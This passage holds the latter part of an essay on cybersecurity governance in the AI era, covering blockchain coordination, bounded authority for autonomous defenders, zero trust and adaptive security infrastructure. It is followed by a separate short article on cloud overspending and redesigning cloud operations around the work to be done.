The attack took months to prepare, so it should not be mistaken for evidence that a fully autonomous adversary executed the entire campaign in seconds. But the incident illustrates how quickly exploitation can outpace an organization's ability to understand, coordinate, and contain its consequences. And it highlights a distinction that will become increasingly important: protecting a private key is not the same thing as protecting the authority to use it.

Even perfect key isolation is insufficient if an attacker can manipulate the infrastructure authorized to request signatures. And even sophisticated security procedures can become ineffective when an attacker changes the underlying state of the system faster than defenders can adapt their response.

Binance, however, is ultimately a centralized organization. It has an established management hierarchy, clear lines of authority, and the ability to direct an emergency response across its infrastructure.

But what happens when there is no central authority capable of coordinating that response? This is precisely the challenge facing decentralized blockchain networks.

Blockchains: The Extreme Case

A decentralized blockchain is not governed by a single corporate security team. Its operation depends on distributed participants, independent software implementations, wallet providers, infrastructure operators, validators or miners, and other ecosystem stakeholders.

This decentralization is an essential feature, not a design defect. It enables permissionless participation and reduces dependence on centralized authorities, but it also introduces an extraordinary coordination challenge.

When a serious vulnerability is discovered in a blockchain protocol, deploying a fix may require agreement among developers, operators, economic stakeholders, and users. Some changes require network upgrades or hard forks. Others depend on many independent organizations updating their software.

In the most consequential cases, there may be no authority capable of unilaterally implementing a system-wide response.

An attacker need not reach consensus. A defender often does.

This does not mean blockchains are inherently less secure than centralized systems. In some ways, they are **more** secure. Decentralization also removes certain single points of failure, and protocol rules can constrain what even powerful participants can do.

But the governance cost is real: decentralized networks pay more to marshal a response to a threat, and more to keep evolving afterward.

Upgrading to post-quantum cryptography is a useful example. A conventional enterprise may have the authority to mandate an upgrade across its infrastructure. A decentralized blockchain must coordinate a migration across independent participants, potentially involving billions of dollars of assets and irreversible transactions.

The technical challenge is substantial, but the governance challenge may prove even more difficult. Developing a secure cryptographic solution is one thing; coordinating its deployment across an entire decentralized ecosystem is another.

In a world where AI accelerates vulnerability discovery and cryptanalysis, the ability to coordinate a safe migration could become as important as the strength of the cryptographic algorithm itself.

The security of a system increasingly depends not only on how difficult it is to compromise, but on how quickly it can adapt when its assumptions fail. And that raises the central question: how can defenders become more adaptive without surrendering the governance and accountability that make their systems trustworthy in the first place?

4. Software Governance in the Age of AI

To defend against increasingly autonomous attackers, organizations must delegate more authority to autonomous defenders. But there will be a limit, given that delegation creates new security risks of its own.

An AI agent empowered to shut down critical infrastructure, revoke credentials, or freeze financial assets could become an extraordinarily dangerous point of failure. If compromised, manipulated, or simply mistaken, it might inflict more damage than the attack it was intended to prevent.

The solution isn't to remove humans from governance. It's to rethink how that governance is exercised.

From Human Approval to Machine-Enforced Boundaries

The traditional model of security governance places humans in the decision-making loop. Policies establish what should happen, software identifies problems, and humans authorize consequential interventions.

The key distinction is between the intelligence that decides what action to attempt and the authority that determines which actions are permitted. These **cannot** be the same thing. Human oversight remains necessary, especially for irreversible actions. But it cannot be the only thing preventing catastrophic outcomes.

Humans should define the acceptable boundaries of system behavior, while automated systems continuously monitor, adapt, and respond within those boundaries. This means replacing reliance on individual approvals with preauthorized, enforceable constraints.

Imagine a financial institution whose autonomous security agents can continuously detect suspicious activity, isolate compromised systems, and revoke credentials without awaiting human approval. These agents might evolve rapidly as new threats emerge. But their authority would remain constrained by independently enforced policies: an agent could suspend a suspicious transaction, for example, but could not authorize a transfer beyond predefined limits or modify the rules governing its own permissions. [8]

In this architecture, intelligence can adapt at machine speed without acquiring unrestricted control. The system's security derives not from trusting the AI to make every decision correctly, but from ensuring that even an incorrect or compromised AI cannot violate fundamental security constraints.

The key is to make safe, reversible containment actions automatic wherever possible, while reserving human approval for decisions whose consequences justify the additional delay.

Zero Trust Becomes a Foundation, Not a Feature

In the post-AI era, **zero trust** will be the foundation of any durably secure software architecture. The central principle of zero trust is that access should not be granted merely because a user or system is already inside a trusted environment. Trust must be established through identity, authorization, context, and continuous evaluation.

NIST's foundational zero-trust framework, SP 800-207, formalized many of these concepts years before the current wave of autonomous AI. [9] But the agentic world makes them far more urgent.

Imagine an enterprise in which hundreds or thousands of autonomous agents continuously interact with sensitive data, production applications, financial systems, and one another. Traditional distinctions between internal and external users, trusted and untrusted networks, or human and machine operators become increasingly inadequate. An agent may be authorized to perform one task but not another. It may need temporary access to a sensitive system without receiving standing privileges. Its permissions may need to change dynamically based on risk, context, or evidence of compromise. [10]

Security therefore needs to become continuous and contextual rather than relying primarily on credentials and permissions established at a particular moment.

This implies several architectural priorities.

  • Eliminate implicit trust: No user, device, application, or AI agent should receive broad authority merely because it has previously authenticated or belongs to a particular organization.
  • Minimize blast radius of compromise: A single credential, service, or agent should not be able to compromise an entire system. Least privilege, compartmentalization, transaction limits, and independently enforced authorization become essential.
  • Design for assumption failure: Security architectures should assume that credentials will be stolen, software will contain vulnerabilities, cryptographic algorithms will eventually require replacement, and security tools themselves may be compromised. [11]
  • Make recovery a first-class security property: Prevention is important, but systems must also be capable of containing damage, revoking compromised authority, and restoring trusted operation.

Interestingly, blockchains already embody some of these principles. Rather than trusting a central authority to determine which transactions are valid, participants independently verify transactions against a common set of rules. Cryptographic signatures establish authorization, while consensus mechanisms allow a decentralized network to maintain a shared state without relying on any single participant.

In a sense, blockchains demonstrate how security can be enforced through architecture rather than institutional trust. The tradeoff, as discussed earlier, is that the same decentralization that limits unilateral authority also makes coordinated adaptation more difficult.

Blockchains illustrate both sides of the challenge: how to minimize the need for trust, and how difficult it becomes to evolve a system once authority is deliberately distributed.

A system that can prevent most attacks but cannot recover from the ones that succeed is not resilient. And a system whose survival depends on any single security assumption holding indefinitely is eventually going to break.

From Security Software to Security Infrastructure

The emerging challenge is to build defensive systems that can adapt continuously without granting their adaptive components unrestricted authority. We already have examples of technologies that demonstrate how this might work.

Consider hardware security modules, or HSMs. These specialized devices isolate cryptographic operations from ordinary application environments, providing a security boundary that can remain meaningful even when surrounding software is compromised.

But HSMs also illustrate an important tradeoff: strong isolation often comes at the expense of flexibility. Supporting new cryptographic algorithms or changing security-sensitive implementations can require firmware updates, vendor support, recertification, or even hardware replacement.

Now consider Cloudflare, which provides a very different model. Instead of expecting every organization to defend itself independently against DDoS attacks, Cloudflare operates continuously updated security infrastructure that detects and mitigates attacks automatically on behalf of its customers. [12]

Crucially, much of this response occurs without the customer having to authorize each defensive action. The customer has already delegated bounded authority to a specialized provider.

The PHP vulnerabilities disclosed in October 2026 showed this model working at scale. Exploitation attempts began four days before public disclosure, yet hosting and content-delivery providers were able to block attacks at their edge while the underlying servers remained unpatched. Protection did not have to wait for the patch. [13]

HSMs demonstrate the value of independent security boundaries. Cloudflare demonstrates the value of continuously adaptive, preauthorized defense. The next generation of security infrastructure will need to combine these properties.

Imagine a platform that uses hardware isolation to protect critical secrets and enforce fundamental authorization constraints, while allowing software responsible for threat detection, cryptographic operations, and incident response to evolve continuously.

The hardware establishes a trustworthy foundation. The software provides flexibility and adaptive intelligence.

This architecture does not require every cryptographic algorithm or defensive technique to be permanently embedded in hardware. Secure hardware might instead protect root credentials, enforce code integrity, authorize trusted updates, or attest to the execution of security-sensitive software.

Such designs require careful engineering: moving cryptographic operations into software can weaken key isolation, and any shared security service introduces new concentration risks.

Nevertheless, the direction is clear. We need security infrastructure that can evolve at machine speed without allowing the intelligence driving that evolution to override its own security boundaries.

5. Securing an Agentic Civilization

Security isn't just for it's own sake. It's about preserving trust in digital systems as an increasing share of human activity is moving onto them. Financial markets, commerce, communications, logistics, healthcare, and critical infrastructure all depend on software.

In an agentic economy, AI will not simply inform human decisions. It will execute them: moving money, negotiating contracts, operating infrastructure, deploying software, and coordinating with other intelligent systems. The attack surface will expand along with that autonomy.

At the same time, the mechanisms we use to govern these systems will be tested by adversaries capable of adapting at speeds no human institution can match through manual intervention alone. This is where the analogy to a Revolution in Military Affairs comes full circle.

The military revolutions of the past were not ultimately defined by the appearance of new weapons. They were defined by the institutions that learned to reorganize themselves around new capabilities.

Cybersecurity now faces a comparable transformation.

Christensen explains why this will be hard. Incumbents rarely fail because they are poorly managed; they fail because they are well managed for an environment that is disappearing. The governance practices that slow defenders were the right answer when attackers moved at human speed, which is exactly what makes them difficult to abandon.

Adding AI to existing security tools is, in Christensen's terms, a sustaining innovation. Organizations that stop there may accelerate individual tasks without solving the underlying problem, leaving their defensive OODA loops constrained by fragmented authority, rigid architectures, and human-speed processes. And as Christensen would predict, the alternative is emerging at the margins: crypto, long dismissed by traditional security circles, has spent a decade building security into architecture rather than process, because its attackers left it no choice.

The organizations that adapt will have to reconsider how security is governed: which decisions can be delegated, where authority resides, how systems contain failures, and how defenses evolve without introducing new catastrophic vulnerabilities.

The answer is not unrestricted autonomy, nor is it the preservation of human control over every operational decision. It is an architecture in which adaptive intelligence operates within independently enforceable boundaries.

The challenge of cybersecurity in the AI era is no longer just how to keep attackers out. It is how to preserve meaningful human control over, and trust in, systems that must defend themselves at machine speed.

Cloud overspending starts with unclear ownership (5 minute read)

tldr • 88 points • November 17, 2026

The answer to enterprise cloud problems is better governance, organizational structure, visibility, and accountability, says Infotech’s Nabeel Sherif.

Golden Dayz

After years of using the clouds, many organizations are coming to realize they didn’t have a proper plan in place from the get-go.

Cloud adoption has often been driven by urgency, not design, according to Nabeel Sherif, principal advisory director at Infotech. It accelerated over the past 15 years, especially during the pandemic. Most organizations moved workloads and adopted SaaS, but the operating models behind that work did not change at the same pace.

Infrastructure and operations teams, network teams included, now run on-premises and cloud side by side, often without a unifying model. They remain accountable for availability, cost, and risk but with far less direct control than in the past.

The cost shows up in the numbers. Flexera’s 2026 State of the Cloud Report, which Sherif cited, estimates that 29% of IaaS and PaaS spend is wasted. Organizations also run 17% over their public cloud budgets on average. 

During a session at the Infotech LIVE 2026 conference in Toronto, Sherif outlined a method for redesigning cloud operations around the work that needs doing, then assigning that work to teams.

“Cloud doesn’t eliminate operations work; it just changes its nature,” Sherif said.

Why more tools and training miss the problem

The common reaction that many organizations have to cloud problems is to buy more tools or add training. Those actions don’t however always solve the underlying issues.

In Sherif’s view, the data points to governance, organizational structure, visibility, and accountability as the right path forward.

Accountability is the sticking point because ownership and control no longer line up in the cloud. “In traditional operations, you assume ownership of the stack. Cloud breaks that assumption,” Sherif said. “You still own the outcomes. You don’t necessarily own all the underlying mechanisms.”

He added that neither self-service nor automation fixes the issues. “Without redesign, you get responsibility without leverage,” he said. “So, governance, cost management, and security practices, if they remain rooted in sort of pre-cloud thinking, that’s going to create tension between the control mechanisms that we have in place and the actual delivery mechanisms that we’re using.”

Designing cloud operations around the work

Operations teams should spend less time executing tasks directly and more time validating services, monitoring outcomes, and managing vendors. That shifts where operational influence has to occur. “Cost, reliability, and security are increasingly determined by design rather than after deployment,” Sherif said.

Sherif’s method starts with the work, not the org chart. A foundational step is to sort cloud work into consuming SaaS, hosting workloads, and building custom services, because each needs different skills and controls.

Most organizations do all of this work, but not in equal measure. Sherif advises starting with the type that carries the most risk or the highest volume of work. An organization that mostly consumes SaaS needs vendor management and integration skills. A development-heavy one needs CI/CD pipelines and developer support structures. “Most organizations do all three simultaneously, treat them the same way, and that’s where things fall down,” Sherif said.

The next step is choosing organizational structures that fit the work. Sherif calls these patterns. He treats them as design options that organizations combine and change over time, not as boxes to check.

Some patterns are ways to govern and learn. A cloud center of excellence (CCoE) and a cloud community of practice apply to every type of work. Others are ways of working. DevOps, site reliability engineering, and platform engineering matter most for build work. “If your organization is mostly consuming SaaS, most of those patterns are not going to be a priority for you,” Sherif said.

The result is a framework of work areas, not an org chart. A work area is a group of related work that needs to get done. It is defined before anyone decides which team handles it.

“Teams do imply people and reporting structures, and that conversation pulls attention to who owns what today, rather than what needs to get done in the future,” Sherif said.

Where leaders can start

Sherif urged organizations to start from the work, not today’s org chart. He asked the room to consider what type of work they do, what makes that work good quality and how to organize around the work rather than around functions.

The order matters. “You want to design the operation model around the work, and then map current teams to it to identify where the gaps and the changes are,” Sherif said.

The resulting framework becomes a communication tool, he said. Leaders use it to explain what they propose and why. Staff use it to see how their roles relate to the broader model.

The friction he sees most often comes from project teams that bypass IT. A team talks to a vendor, builds or buys a solution, then tells IT only afterward.

Unaligned expectations drive that friction. Sherif relayed a friend’s saying about babies. “Babies aren’t dumb they’re just new,” he said. “[If] people don’t know stuff, then you can’t expect them to be smart about stuff. So, we need to set those expectations.”
